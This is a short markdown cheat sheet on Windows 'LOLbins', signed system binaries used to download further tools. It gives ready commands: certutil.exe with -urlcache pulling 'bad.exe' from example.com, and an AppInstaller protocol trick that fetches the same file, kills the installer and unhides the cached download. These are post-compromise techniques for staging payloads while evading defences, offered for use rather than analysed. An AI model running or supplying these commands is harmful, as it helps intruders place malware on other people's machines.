# LOLbins
The following are some windows lolbins to download more tools

## certutil.exe

This is a signed native application used to download new tools:
```
> certutil.exe -urlcache -split -f http://example.com/bad.exe local_bad.exe
```
## AppInstaller.exe
This is another LOLbin for downloading tools,
```
> start ms-appinstaller://?source=https://example.com/bad.exe && timeout 1 && taskkill /f /IM AppInstaller.exe > NUL
> attrib -h -r -s /s /d %LOCALAPPDATA%\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\*
```
